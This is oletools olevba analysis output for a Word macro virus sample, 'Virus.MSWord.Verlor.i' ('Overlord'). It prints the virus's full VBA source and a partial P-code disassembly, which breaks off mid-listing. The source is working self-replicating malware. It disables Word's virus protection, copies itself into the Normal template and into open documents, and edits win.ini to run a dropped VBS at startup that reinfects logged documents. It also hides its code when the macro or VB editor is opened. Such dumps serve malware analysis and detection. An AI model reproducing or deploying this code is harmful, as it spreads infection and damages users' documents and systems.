olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Verlor.i
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Verlor.i - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module.bas 
in file: Virus.MSWord.Verlor.i - OLE stream: 'Macros/VBA/Module'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 
Option Explicit
 
Private Declare Function GetWindowsDirectory Lib "kernel32" _
   Alias "GetWindowsDirectoryA" _
  (ByVal lpBuffer As String, ByVal nSize As Long) As Long
 
Private Function GetWinDir() As String
    Dim nSize As Long
    Dim tmp As String
   
   'pad the string for the return value and
   'set nSize equal to the size of the string
    tmp = Space$(256)
    nSize = Len(tmp)
 
   'call the API
    Call GetWindowsDirectory(tmp, nSize)
    
   'trim off the trailing null added by the API
    GetWinDir = TrimNull(tmp)
End Function
 
Private Function TrimNull(item As String)
    Dim pos As Integer
   
   'double check that there is a chr$(0) in the string
    pos = InStr(item, Chr$(0))
    If pos Then
          TrimNull = Left$(item, pos - 1)
    Else: TrimNull = item
    End If
End Function



Sub AutoClose()

'MyName = Overlord
'WrittenBy = f0re [UC/Skamwerks/DVC]
'Version = .B (1.1)
Dim line
On Error Resume Next
Dim windir
windir = Environ("windir")
If Dir(windir & "\tempad.dll") <> "" Then Kill (windir & "\tempad.dll")
If Dir(windir & "\tempnt.dll") <> "" Then Kill (windir & "\tempnt.dll")

Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False

If NormalTemplate.VBProject.VBComponents.item("Module").CodeModule.Lines(3, 1) <> "'MyName = Overlord" Then
ActiveDocument.VBProject.VBComponents("Module").Export (windir & "\tempad.dll")
NormalTemplate.VBProject.VBComponents.import (windir & "\tempad.dll")
NormalTemplate.Save
End If
If ActiveDocument.VBProject.VBComponents.item("Module").CodeModule.Lines(3, 1) <> "'MyName = Overlord" Then
NormalTemplate.VBProject.VBComponents("Module").Export (windir & "\tempnt.dll")
ActiveDocument.VBProject.VBComponents.import (windir & "\tempnt.dll")
ActiveDocument.SaveAs ActiveDocument.FullName
End If

If Dir("c:\Himem.sys") <> "" Then
Open "c:\Himem.sys" For Input As #1
Open "c:\Himem.sy_" For Output As #2
Do While Not EOF(1)
 Input #1, line
 If line <> ActiveDocument.FullName Then Print #2, line
Loop
Close #1
Close #2

Kill ("c:\Himem.sys")
FileCopy "c:\Himem.sy_", "c:\Himem.sys"
Kill ("c:\Himem.sy_")
End If

End Sub
Sub AutoOpen()

On Error Resume Next
Dim windir
windir = Environ("windir")

Open "c:\Himem.sys" For Append As #1
Print #1, ActiveDocument.FullName
Close #1

End Sub

Sub Stealth()
On Error Resume Next
Dim windir, line
windir = Environ("windir")

System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\software\", "RegisteredOwner") = "the Overlord"

Open windir & "\win.ini" For Input As #1
Open "c:\win._ni" For Output As #2
Do While Not EOF(1)
 Line Input #1, line
 If line = "[windows]" Then
  Print #2, line
  Print #2, "run = " & windir & "\overlord.b.vbs"
 Else
  Print #2, line
 End If
Loop
Close #1
Close #2

FileCopy "c:\win._ni", windir & "\win.ini"
Kill ("c:\win._ni")

If Dir(windir & "\overlord.b.vbs") <> "" Then Kill (windir & "\overlord.b.vbs")

Open "c:\windows\overlord.b.vbs" For Append As #1
Print #1, "On error resume next"
Print #1, ""
Print #1, "Set WordObj = CreateObject(" & Chr(34) & "Word.Application" & Chr(34) & ")"
Print #1, "WordObj.Options.SaveNormalPrompt = False"
Print #1, "WordObj.NormalTemplate.VBProject.VBComponents.remove WordObj.NormalTemplate.VBProject.VBComponents(" & Chr(34) & "Module" & Chr(34) & ")"
Print #1, "WordObj.NormalTemplate.save"
Print #1, "WordObj.NormalTemplate.VBProject.VBComponents.import (" & Chr(34) & windir & "\overlord.b.dll" & Chr(34) & ")"
Print #1, "WordObj.NormalTemplate.save"
Print #1, ""
Print #1, "Dim FSO"
Print #1, "Set FSO = CreateObject(" & Chr(34) & "Scripting.FileSystemObject" & Chr(34) & ")"
Print #1, "set a =  FSO.OpenTextFile(" & Chr(34) & "c:\himem.sys" & Chr(34) & ", 1, True)"
Print #1, "contents = a.readall()"
Print #1, "a.close"
Print #1, "set b =  FSO.OpenTextFile(" & Chr(34) & "c:\himem.dll" & Chr(34) & ", 2, True)"
Print #1, "b.write(contents)"
Print #1, "b.close"
Print #1, "set a =  FSO.OpenTextFile(" & Chr(34) & "c:\himem.dll" & Chr(34) & ", 1, True)"
Print #1, "Do While a.atendofstream <> True"
Print #1, "documentname = a.readline"
Print #1, "If documentname <> " & Chr(34) & Chr(34) & " then"
Print #1, "WordObj.Documents.open (documentname)"
Print #1, "WordObj.activedocument.save"
Print #1, "WordObj.activedocument.close"
Print #1, "End if"
Print #1, "Loop"
Print #1, "a.close"
Print #1, "set NT = " & Chr(34) & Chr(34)
Print #1, "WordObj.Quit"
Print #1, "fso.deletefile" & Chr(34) & "c:\himem.sys" & Chr(34)
Print #1, "fso.deletefile" & Chr(34) & "c:\himem.dll" & Chr(34)
Close #1

NormalTemplate.VBProject.VBComponents("Module").Export (windir & "\overlord.b.dll")

End Sub
Sub ViewVBCode()
Dim docnumber, x
On Error Resume Next

Call Stealth

NormalTemplate.VBProject.VBComponents("Module").CodeModule.deletelines 1, NormalTemplate.VBProject.VBComponents("Module").CodeModule.CountOfLines
NormalTemplate.Saved = True
NormalTemplate.VBProject.VBComponents.Remove NormalTemplate.VBProject.VBComponents("Module")
NormalTemplate.Saved = True

docnumber = Application.Documents.Count
If docnumber >= 1 Then
For x = 1 To docnumber
Documents(x).VBProject.VBComponents("Module").CodeModule.deletelines 1, Documents(x).VBProject.VBComponents("Module").CodeModule.CountOfLines
Documents(x).Saved = True
Documents(x).VBProject.VBComponents.Remove Documents(x).VBProject.VBComponents("Module")
Documents(x).Saved = True
Next x
End If

Application.ShowVisualBasicEditor = True

End Sub
Sub ToolsMacro()
Dim x, y, codent, docnumber, codead

On Error Resume Next

For x = 1 To NormalTemplate.VBProject.VBComponents("Module").CodeModule.CountOfLines
 codent = codent & NormalTemplate.VBProject.VBComponents("Module").CodeModule.Lines(x, 1) & Chr(13)
Next x
NormalTemplate.VBProject.VBComponents("Module").CodeModule.deletelines 1, NormalTemplate.VBProject.VBComponents("Module").CodeModule.CountOfLines
NormalTemplate.Saved = True

docnumber = Application.Documents.Count
If docnumber >= 1 Then
 For y = 1 To ActiveDocument.VBProject.VBComponents("Module").CodeModule.CountOfLines
  codead = codead & ActiveDocument.VBProject.VBComponents("Module").CodeModule.Lines(y, 1) & Chr(13)
 Next y
 For x = 1 To docnumber
 Documents(x).VBProject.VBComponents("Module").CodeModule.deletelines 1, Documents(x).VBProject.VBComponents("Module").CodeModule.CountOfLines
 Documents(x).Saved = True
 Next x
End If

Application.Dialogs(wdDialogToolsMacro).Show

If Application.ShowVisualBasicEditor = False Then
 NormalTemplate.VBProject.VBComponents("Module").CodeModule.InsertLines 1, codent
 NormalTemplate.Save
 
If docnumber >= 1 Then
For x = 1 To docnumber
Documents(x).VBProject.VBComponents("Module").CodeModule.InsertLines 1, codead
Documents(x).SaveAs Documents(x).FullName
Next x
End If
End If
End Sub

'Put this code in a module called "Module". This is another version of overlord.
'It uses a different stealth mechanism. Again however not perfect stealth,
'but perhaps also a nice attempt i hope :).


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Verlor.i
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Module - 12829 bytes
' Line #0:
' Line #1:
' 	Option  (Explicit)
' Line #2:
' Line #3:
' 	LineCont 0x0008 06 00 03 00 08 00 02 00
' 	FuncDefn (Private Declare Function GetWindowsDirectory Lib "kernel32" (ByVal lpBuffer As String, ByVal nSize As Long) As Long)
' Line #4:
' Line #5:
' 	FuncDefn (Private Function GetWinDir() As String)
' Line #6:
' 	Dim 
' 	VarDefn nSize (As Long)
' Line #7:
' 	Dim 
' 	VarDefn tmp (As String)
' Line #8:
' Line #9:
' 	QuoteRem 0x0003 0x0027 "pad the string for the return value and"
' Line #10:
' 	QuoteRem 0x0003 0x0029 "set nSize equal to the size of the string"
' Line #11:
' 	LitDI2 0x0100 
' 	ArgsLd Space$ 0x0001 
' 	St tmp 
' Line #12:
' 	Ld tmp 
' 	FnLen 
' 	St nSize 
' Line #13:
' Line #14:
' 	QuoteRem 0x0003 0x000C "call the API"
' Line #15:
' 	Ld tmp 
' 	Ld nSize 
' 	ArgsCall (Call) GetWindowsDirectory 0x0002 
' Line #16:
' Line #17:
' 	QuoteRem 0x0003 0x002B "trim off the trailing null added by the API"
' Line #18:
' 	Ld tmp 
' 	ArgsLd TrimNull 0x0001 
' 	St GetWinDir 
' Line #19:
' 	EndFunc 
' Line #20:
' Line #21:
' 	FuncDefn (Private Function TrimNull(item As String))
' Line #22:
' 	Dim 
' 	VarDefn pos (As Integer)
' Line #23:
' Line #24:
' 	QuoteRem 0x0003 0x0032 "double check that there is a chr$(0) in the string"
' Line #25:
' 	Ld item 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	FnInStr 
' 	St pos 
' Line #26:
' 	Ld pos 
' 	IfBlock 
' Line #27:
' 	Ld item 
' 	Ld pos 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound$ 0x0002 
' 	St TrimNull 
' Line #28:
' 	ElseBlock 
' 	BoS 0x0000 
' 	Ld item 
' 	St TrimNull 
' Line #29:
' 	EndIfBlock 
' Line #30:
' 	EndFunc 
' Line #31:
' Line #32:
' Line #33:
' Line #34:
' 	FuncDefn (Sub AutoClose())
' Line #35:
' Line #36:
' 	QuoteRem 0x0000 0x0011 "MyName = Overlord"
' Line #37:
' 	QuoteRem 0x0000 0x0023 "WrittenBy = f0re [UC/Skamwerks/DVC]"
' Line #38:
' 	QuoteRem 0x0000 0x0012 "Version = .B (1.1)"
' Line #39:
' 	Dim 
' 	VarDefn Like
' Line #40:
' 	OnError (Resume Next) 
' Line #41:
' 	Dim 
' 	VarDefn windir
' Line #42:
' 	LitStr 0x0006 "windir"
' 	ArgsLd Environ 0x0001 
' 	St windir 
' Line #43:
' 	Ld windir 
' 	LitStr 0x000B "\tempad.dll"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld windir 
' 	LitStr 0x000B "\tempad.dll"
' 	Concat 
' 	Paren 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #44:
' 	Ld windir 
' 	LitStr 0x000B "\tempnt.dll"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld windir 
' 	LitStr 0x000B "\tempnt.dll"
' 	Concat 
' 	Paren 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #45:
' Line #46:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #47:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #48:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #49:
' Line #50:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	LitStr 0x0006 "Module"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0012 "'MyName = Overlord"
' 	Ne 
' 	IfBlock 
' Line #51:
' 	Ld windir 
' 	LitStr 0x000B "\tempad.dll"
' 	Concat 
' 	Paren 
' 	LitStr 0x0006 "Module"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #52:
' 	Ld windir 
' 	LitStr 0x000B "\tempad.dll"
' 	Concat 
' 	Paren 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #53:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #54:
' 	EndIfBlock 
' Line #55:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	LitStr 0x0006 "Module"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0012 "'MyName = Overlord"
' 	Ne 
' 	IfBlock 
' Line #56:
' 	Ld windir 
' 	LitStr 0x000B "\tempnt.dll"
' 	Concat 
' 	Paren 
' 	LitStr 0x0006 "Module"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #57:
' 	Ld windir 
' 	LitStr 0x000B "\tempnt.dll"
' 	Concat 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #58:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #59:
' 	EndIfBlock 
' Line #60:
' Line #61:
' 	LitStr 0x000C "c:\Himem.sys"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #62:
' 	LitStr 0x000C "c:\Himem.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #63:
' 	LitStr 0x000C "c:\Himem.sy_"
' 	LitDI2 0x0002 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #64:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #65:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Input 
' 	Ld Like 
' 	InputItem 
' 	InputDone 
' Line #66:
' 	Ld Like 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	Ld Like 
' 	PrintItemNL 
' 	EndIf 
' Line #67:
' 	Loop 
' Line #68:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #69:
' 	LitDI2 0x0002 
' 	Sharp 
' 	Close 0x0001 
' Line #70:
' Line #71:
' 	LitStr 0x000C "c:\Himem.sys"
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #72:
' 	LitStr 0x000C "c:\Himem.sy_"
' 	LitStr 0x000C "c:\Himem.sys"
' 	ArgsCall FileCopy 0x0002 
' Line #73:
' 	LitStr 0x000C "c:\Himem.sy_"
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #74:
' 	EndIfBlock 
' Line #75:
' Line #76:
' 	EndSub 
' Line #77:
' 	FuncDefn (Sub AutoOpen())
' Line #78:
' Line #79:
' 	OnError (Resume Next) 
' Line #80:
' 	Dim 
' 	VarDefn windir
' Line #81:
' 	LitStr 0x0006 "windir"
' 	ArgsLd Environ 0x0001 
' 	St windir 
' Line #82:
' Line #83:
' 	LitStr 0x000C "c:\Himem.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #84:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	PrintItemNL 
' Line #85:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #86:
' Line #87:
' 	EndSub 
' Line #88:
' Line #89:
' 	FuncDefn (Sub Stealth())
' Line #90:
' 	OnError (Resume Next) 
' Line #91:
' 	Dim 
' 	VarDefn windir
' 	VarDefn Like
' Line #92:
' 	LitStr 0x0006 "windir"
' 	ArgsLd Environ 0x0001 
' 	St windir 
' Line #93:
' Line #94:
' 	LitStr 0x000C "the Overlord"
' 	LitStr 0x0000 ""
' 	LitStr 0x001C "HKEY_LOCAL_MACHINE\software\"
' 	LitStr 0x000F "RegisteredOwner"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #95:
' Line #96:
' 	Ld windir 
' 	LitStr 0x0008 "\win.ini"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #97:
' 	LitStr 0x000A "c:\win._ni"
' 	LitDI2 0x0002 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #98:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #99:
' 	LitDI2 0x0001 
' 	Ld Like 
' 	LineInput 
' Line #100:
' 	Ld Like 
' 	LitStr 0x0009 "[windows]"
' 	Eq 
' 	IfBlock 
' Line #101:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	Ld Like 
' 	PrintItemNL 
' Line #102:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "run = "
' 	Ld windir 
' 	Concat 
' 	LitStr 0x000F "\overlord.b.vbs"
' 	Concat 
' 	PrintItemNL 
' Line #103:
' 	ElseBlock 
' Line #104:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	Ld Like 
' 	PrintItemNL 
' Line #105:
' 	EndIfBlock 
' Line #106:
' 	Loop 
' Line #107:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #108:
' 	LitDI2 0x0002 
' 	Sharp 
' 	Close 0x0001 
' Line #109:
' Line #110:
' 	LitStr 0x000A "c:\win._ni"
' 	Ld windir 
' 	LitStr 0x0008 "\win.ini"
' 	Concat 
' 	ArgsCall FileCopy 0x0002 
' Line #111:
' 	LitStr 0x000A "c:\win._ni"
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #112:
' Line #113:
' 	Ld windir 
' 	LitStr 0x000F "\overlord.b.vbs"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld windir 
' 	LitStr 0x000F "\overlord.b.vbs"
' 	Concat 
' 	Paren 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #114:
' Line #115:
' 	LitStr 0x0019 "c:\windows\overlord.b.vbs"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #116:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "On error resume next"
' 	PrintItemNL 
' Line #117:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #118:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "Set WordObj = CreateObject("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0010 "Word.Application"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	PrintItemNL 
' Line #119:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0028 "WordObj.Options.SaveNormalPrompt = False"
' 	PrintItemNL 
' Line #120:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0063 "WordObj.NormalTemplate.VBProject.VBComponents.remove WordObj.NormalTemplate.VBProject.VBComponents("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0006 "Module"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	PrintItemNL 
' Line #121:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "WordObj.NormalTemplate.save"
' 	PrintItemNL 
' Line #122:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "WordObj.NormalTemplate.VBProject.VBComponents.import ("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld windir 
' 	Concat 
' 	LitStr 0x000F "\overlord.b.dll"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	PrintItemNL 
' Line #123:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "WordObj.NormalTemplate.save"
' 	PrintItemNL 
' Line #124:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #125:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "Dim FSO"
' 	PrintItemNL 
' Line #126:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "Set FSO = CreateObject("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x001A "Scripting.FileSystemObject"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	PrintItemNL 
' Line #127:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "set a =  FSO.OpenTextFile("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000C "c:\himem.sys"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000A ", 1, True)"
' 	Concat 
' 	PrintItemNL 
' Line #128:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 "contents = a.readall()"
' 	PrintItemNL 
' Line #129:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "a.close"
' 	PrintItemNL 
' Line #130:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "set b =  FSO.OpenTextFile("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000C "c:\himem.dll"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000A ", 2, True)"
' 	Concat 
' 	PrintItemNL 
' Line #131:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "b.write(contents)"
' 	PrintItemNL 
' Line #132:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "b.close"
' 	PrintItemNL 
' Line #133:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "set a =  FSO.OpenTextFile("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000C "c:\himem.dll"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000A ", 1, True)"
' 	Concat 
' 	PrintItemNL 
' Line #134:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "Do While a.atendofstream <> True"
' 	PrintItemNL 
' Line #135:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 "documentname = a.readline"
' 	PrintItemNL 
' Line #136:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "If documentname <> "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0005 " then"
' 	Concat 
' 	PrintItemNL 
' Line #137:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0025 "WordObj.Documents.open (documentname)"
' 	PrintItemNL 
' Line #138:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "WordObj.activedocument.save"
' 	PrintItemNL 
' Line #139:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "WordObj.activedocument.close"
' 	PrintItemNL 
' Line #140:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "End if"
' 	PrintItemNL 
' Line #141:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "Loop"
' 	PrintItemNL 
' Line #142:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "a.close"
' 	PrintItemNL 
' Line #143:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "set NT = "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #144:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "WordObj.Quit"
' 	PrintItemNL 
' Line #145:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "fso.deletefile"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000C "c:\himem.sys"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #146:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "fso.deletefile"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000C "c:\himem.dll"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #147:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #148:
' Line #149:
' 	Ld windir 
' 	LitStr 0x000F "\overlord.b.dll"
' 	Concat 
' 	Paren 
' 	LitStr 0x0006 "Module"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #150:
' Line #151:
' 	EndSub 
' Line #152:
' 	FuncDefn (Sub ViewVBCode())
' Line #153:
' 	Dim 
' 	VarDefn docnumber
' 	VarDefn x
' Line #154:
' 	OnError (Resume Next) 
' Line #155:
' Line #156:
' 	ArgsCall (Call) Stealth 0x0000 
' Line #157:
' Line #158:
' 	LitDI2 0x0001 
' 	LitStr 0x0006 "Module"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitStr 0x0006 "Module"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #159:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #160:
' 	LitStr 0x0006 "Module"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Remove 0x0001 
' Line #161:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #162:
' Line #163:
' 	Ld Application 
' 	MemLd Documents 
' 	MemLd Count 
' 	St docnumber 
' Line #164:
' 	Ld docnumber 
' 	LitDI2 0x0001 
' 	Ge 
' 	IfBlock 
' Line #165:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld docnumber 
' 	For 
' Line #166:
' 	LitDI2 0x0001 
' 	LitStr 0x0006 "Module"
' 	Ld x 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitStr 0x0006 "Module"
' 	Ld x 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #167:
' 	LitVarSpecial (True)
' 	Ld x 
' 	ArgsLd Documents 0x0001 
' 	MemSt Saved 
' Line #168:
' 	LitStr 0x0006 "Module"
' 	Ld x 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Ld x 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Remove 0x0001 
' Line #169:
' 	LitVarSpecial (True)
' 	Ld x 
' 	ArgsLd Documents 0x0001 
' 	MemSt Saved 
' Line #170:
